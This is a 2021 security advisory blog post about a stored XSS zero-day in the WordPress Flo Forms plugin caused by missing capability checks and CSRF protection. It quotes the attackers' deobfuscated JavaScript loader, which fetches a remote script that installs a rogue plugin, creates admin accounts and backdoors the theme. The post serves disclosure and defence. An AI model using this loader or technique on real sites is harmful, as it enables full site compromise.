# Zero-day vulnerability fixed in WordPress Flo Forms plugin.

* by [Jerome Bruandet](https://blog.nintechnet.com/author/bruandet/)
* Posted on [March 16, 2021 - 11:18pm [+0700]](https://blog.nintechnet.com/zero-day-vulnerability-fixed-in-wordpress-flo-forms-plugin/)

The WordPress [Flo Forms](https://wordpress.org/plugins/flo-forms/) plugin (10,000+ installations) fixed a zero-day vulnerability affecting version 1.0.35 and below that could allow an attacker to fully compromise the blog.

> This vulnerability is currently being exploited, make sure to update immediately the plugin and to follow the recommendations below.

### Authenticated Options Change & Stored XSS

In the “flo-forms/includes/class-flo-forms.php” lines 237 and 239, the plugin registers the `flo_export_forms_options` and `flo_import_forms_options` AJAX actions:

```
$this->loader->add_action( 'wp_ajax_flo_export_forms_options', $plugin_admin, 'flo_export_forms_options' );

$this->loader->add_action( 'wp_ajax_flo_import_forms_options', $plugin_admin, 'flo_import_forms_options' );

```

Both functions, in the “flo-forms/admin/class-flo-forms-admin.php” script lines 806 and 823, are accessible to any logged in user: they don’t check if the user is an administrator (`manage_options` capability). Additionally, the `flo_import_forms_options` function lacks a security nonce to protect against CSRF attacks. Hackers are currently using that function to import a new configuration and to inject JS code into the “custom\_date\_format” field that will be executed in the admin back end because the data in the settings page isn’t sanitised. It is also present and visible in the front end but, in this case, it is harmless:

![](https://blog.nintechnet.com/wp-content/uploads/2021/03/wordpress-flo-forms-0day.png)

Deobfuscated JS code:

```
!function(e,s,t){(t=e.createElement(s)).async=!0,t.id="tmpjs",t.src="https://js-unpkg.com/tmp/tmp.js",(e=e.getElementsByTagName(s)[0]).parentNode.insertBefore(t,e)}(document,"script");
```

When the admin visits the back end, the code at `https://js-unpkg.com/tmp/tmp.js` will install a rogue plugin named “woocommerce-admin-demo”, create new admin accounts such as `woocommerce_develop_users_8`, `wootestdevelp`, `trust_help_admin`, `6f7g8huonim36fi7Ff`, `userdeveloptest` or `systemwpcl`, use the built-in theme editor to backdoor the theme, and other joys.

[I explained a few weeks ago](https://blog.nintechnet.com/how-hackers-exploit-xss-vulnerabilities-to-create-admin-accounts-on-your-wordpress-blog/) how a few hundred bytes of JavaScript code injected into the admin backend could have devastating consequences and lead to a fully compromised website, and this zero-day vulnerability is another perfect example.

### Recommendations

Update immediately if you are using version 1.0.35 or below. If you are using our web application firewall for WordPress, [NinjaFirewall WP Edition](https://wordpress.org/plugins/ninjafirewall/) (free) and [NinjaFirewall WP+ Edition](https://nintechnet.com/ninjafirewall/wp-edition/) (premium), you are protected against this vulnerability.

### Timeline

The vulnerability was reported to the authors on March 16th, 2021 and a new version 1.0.36 was released a few hours later.

### Description

The Flo Forms – Easy Drag & Drop Form Builder plugin for WordPress is vulnerable to Stored Cross-Site Scripting via Options Change by using the flo\_import\_forms\_options AJAX action in versions up to, and including, 1.0.35 due to insufficient input sanitization and output escaping along with missing capability checks. This makes it possible for authenticated attackers, like subscribers, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
